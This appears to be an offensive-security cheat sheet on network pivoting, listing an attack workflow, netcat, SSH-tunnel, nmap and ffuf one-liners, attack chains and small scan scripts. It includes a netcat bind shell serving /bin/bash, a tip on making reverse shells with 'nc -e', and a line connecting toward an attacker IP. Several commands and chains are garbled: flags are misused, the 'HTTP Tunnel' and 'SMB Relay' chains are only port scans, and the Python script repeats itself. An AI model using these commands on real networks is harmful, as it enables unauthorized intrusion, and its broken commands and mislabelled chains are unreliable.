# 94-Pivoting Commands

Pivoting is the art of routing traffic through an internal host to access targets unreachable directly. Essential for bypassing port filtering, discovering hidden services, and extending attack surface.

## Attack Workflow

1. **Identify Internal Assets**: Scan the internal network using your compromised host as a relay.
2. **Service Enumeration**: Enumerate ports/services exposed on internal targets.
3. **Gain Access**: Exploit discovered vulnerabilities or authenticate as a user with pivoting privileges.
4. **Deep Dive**: Use the new pivot point to attack internal targets that are not accessible from your initial compromise.

## Commands & One-liners

```bash
# Initial internal scan via existing host
nmap -p- -T4 -O {target}.internal --script=vuln {target}.internal
nmap --script=cpe {target}.internal

# SSH Tunneling (Bypassing firewall rules)
ssh -L 80:webserver:80 user@{target}.internal -D 25425
# Access via port forwarding
curl -p 25425 http://example.com

# HTTP Tunneling (Exfiltrating data or probing)
nc -vlp 4444 -e /bin/bash
nc {target}.internal {attacker-ip} 4444
# Or via proxy tool
nc -zv {target}.internal 8080
nc -zv {internal-host} 80

# Custom port scanner for internal discovery
ffuf -u http://{}-{{service}}.internal/ -w /home/vuln/wordlists/directory.txt -H "User-Agent: GoBuster"

# Nmap service version detection on pivoted target
nmap --open --min-rate 500 {target}.internal

# Check for SMB/NetBIOS services
nmap -sV -p 445 {target}.internal --script=smb-vuln
nmap -sU -p 137,138,139 {target}.internal

# Check for open ports on {target}.internal
nc -zv {target}.internal 22
nc -zv {target}.internal 80
nc -zv {target}.internal 3389
nc -zv {target}.internal 1433
nc -zv {target}.internal 3306

# HTTP HEAD request to check content type
curl -I http://{target}.internal/

# Check if {target}.internal is reachable
curl --connect-timeout 2 {target}.internal:80
curl --connect-timeout 2 {target}.internal:443
```

## Attack Chains

1. **Initial Host -> Internal Server**
   ```bash
   ssh -L 8080:target:80 user@compromised-host
   curl http://localhost:8080
   ```

2. **HTTP Tunnel -> Internal Server**
   ```bash
   nc -zv {target}.internal 8080
   nc -zv {target}.internal 443
   nc -zv {target}.internal 8080
   ```

3. **SMB Relay -> Internal Target**
   ```bash
   nmap --script=smb-vuln -p 445 {target}.internal
   nmap -sV -p 445 {target}.internal
   nmap -sV -p 139 {target}.internal
   nmap -sV -p 3306 {target}.internal
   nmap -sV -p 3389 {target}.internal
   ```

## Tips & Shortcuts

- Use `nmap --script=vuln` for quick vulnerability scanning on internal targets.
- Use `nmap --script=cpe` for complete service/version detection.
- Use `curl --connect-timeout 2` to check reachability quickly.
- Use `nc -zv` for quick port checks.
- Use `nc -e` to create reverse shells.
- Use `ffuf` with `-U` for user-agent injection.
- Use `gobuster` with `-d` for directory enumeration on internal targets.

## Common Mistakes

- Forgetting to open ports before attempting to connect.
- Assuming all internal hosts are accessible via their public IP.
- Using wrong protocols (e.g., HTTP instead of SMB).
- Neglecting to check for open ports before scanning services.
- Forgetting to use proper authentication credentials.

## Mini Automation Scripts

### Bash: Quick Port Scan
```bash
#!/bin/bash
target="${1:-{target}.internal}"
nmap -p- -T4 --script=vuln $target
```

### Python: Simple Port Check
```python
import socket
import argparse

target = input("Enter target IP or hostname: ")
port = int(input("Enter port number: "))

try:
    s = socket.socket()
    s.settimeout(1)
    result = s.connect_ex((target, port))
    if result == 0:
        print("Port is open")
    else:
        print("Port is closed")
except Exception as e:
    print(f"Error: {e}")

if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "{target}.internal"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    try:
        s = socket.socket()
        s.settimeout(1)
        result = s.connect_ex((target, port))
        if result == 0:
            print("Port is open")
        else:
            print("Port is closed")
    except Exception as e:
        print(f"Error: {e}")
```

### Bash: HTTP Directory Brute-forcing
```bash
#!/bin/bash
url="http://{}-{{dir}}.{target}/"
domain="${target}"
wordlist=/home/vuln/wordlists/small-directories.txt
ffuf -u ${url} -w ${wordlist} -H "User-Agent: GoBuster"
```